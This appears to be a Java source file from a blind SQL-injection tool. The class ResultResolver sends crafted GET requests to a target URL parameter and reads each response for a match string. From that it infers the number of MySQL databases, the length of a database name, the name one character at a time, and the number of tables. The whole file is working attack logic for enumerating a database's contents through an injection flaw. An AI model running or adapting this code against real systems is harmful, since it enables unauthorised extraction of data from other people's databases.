/**
 * @ ResultResolver.java
 */
package logic.sqlinjection;

import java.util.List;

import logic.domain.DbmsType;
import logic.domain.QueryCondition;
import logic.domain.QueryType;
import logic.domain.TargetType;
import logic.http.HttpUrlResolver;
import logic.http.URLMaker;
import logic.sqlinjection.query.QueryMaker;

/**
 * <pre>
 * logic.sqlinjection
 * ResultResolver.java 
 * </pre>
 *
 * @brief	: 판정결과(SuccessDecider)를 토대로 결과를 완성해나가는 클래스 
 * @author	: Jae-Woong Moon(mjw8585@gmail.com)
 * @Date	: 2017/08/16
 */
public class ResultResolver {

	private SuccessDecider decider = null;
	private QueryMaker qm = null;
	private URLMaker urlMaker = null;
	private HttpUrlResolver urlResolver = null;
	
	public ResultResolver() {
		decider = new SuccessDecider();
		qm = new QueryMaker();
		urlMaker = new URLMaker();
		urlResolver = new HttpUrlResolver();
	}


	public int getDBCount(String targetURL, String match, int until, String targetParam){
		int cnt = 0;
		for(int i=0; i < until; i++){
			// STEP 1. 요청 URL 생성
			QueryCondition cond = new QueryCondition(DbmsType.MY_SQL, TargetType.DB_SCHEMA, QueryType.COUNT);
			cond.setCheckVal(i+"");
			String query = qm.getQuery(cond);
			String URL = urlMaker.getURL(targetURL, targetParam, query);
			//System.out.println(URL);
			// STEP 2. URL 요청 및 결과 확인
			String res = urlResolver.sendGet(URL);
			//System.out.println(res);
			if(decider.isSuccess(res, match)){
				cnt = i;
				break;
			}
		}
		return cnt;
	}
	
	public int getDBNameLength(String targetURL, String match,int targetDBIndex, int until, String targetParam){
		int cnt = 0;
		for(int i=0; i < until; i++){
			// STEP 1. 요청 URL 생성
			QueryCondition cond = new QueryCondition(DbmsType.MY_SQL, TargetType.DB_SCHEMA, QueryType.LENGTH);
			cond.setCheckVal(i+"");
			cond.setDbIndex(targetDBIndex);
			String query = qm.getQuery(cond);
			String URL = urlMaker.getURL(targetURL, targetParam, query);
			//System.out.println(URL);
			// STEP 2. URL 요청 및 결과 확인
			String res = urlResolver.sendGet(URL);
			if(decider.isSuccess(res, match)){
				cnt = i;
				break;
			}
		}
		return cnt;
	}
	
	public String getDBName(String targetURL, String match, int targetDBIndex, int targetDBLength, String targetParam){
		// 여기서부터는 이중 for 문이 필요 (i: DB이름의 index, 시도하고자 하는 문자의 index)
		String dbName = "";
		for(int i=0; i < targetDBLength ; i++){
			for(int j=33; j < 127; j++){ //(아스키 33~126까지 찾기)
				// STEP 1. 요청 URL 생성
				QueryCondition cond = new QueryCondition(DbmsType.MY_SQL, TargetType.DB_SCHEMA, QueryType.CONTENT);
				cond.setCheckVal("char("+j+")");
				cond.setDbIndex(targetDBIndex);
				cond.setDbNameIndex(i+1);
				String query = qm.getQuery(cond);
				String URL = urlMaker.getURL(targetURL, targetParam, query);
				//System.out.println(URL);
				
				// STEP 2. URL 요청 및 결과 확인
				String res = urlResolver.sendGet(URL);
				if(decider.isSuccess(res, match)){
					//System.out.println("find !! at : " + j);
					String ascii = Character.toString((char)j);
					dbName += ascii;
					break;
				}
			}
		}
		return dbName;
	}
	
	public int getTableCount(String targetURL, String match, String dbName, int until, String targetParam){
		int cnt = 0;
		for(int i=0; i < until; i++){
			// STEP 1. 요청 URL 생성
			QueryCondition cond = new QueryCondition(DbmsType.MY_SQL, TargetType.TABLE, QueryType.COUNT);
			cond.setCheckVal(i+"");
			cond.setDbName(dbName);
			
			String query = qm.getQuery(cond);
			String URL = urlMaker.getURL(targetURL, targetParam, query);
			// STEP 2. URL 요청 및 결과 확인
			String res = urlResolver.sendGet(URL);
			if(decider.isSuccess(res, match)){
				cnt = i;
				break;
			}
		}
		return cnt;
	}
	
}
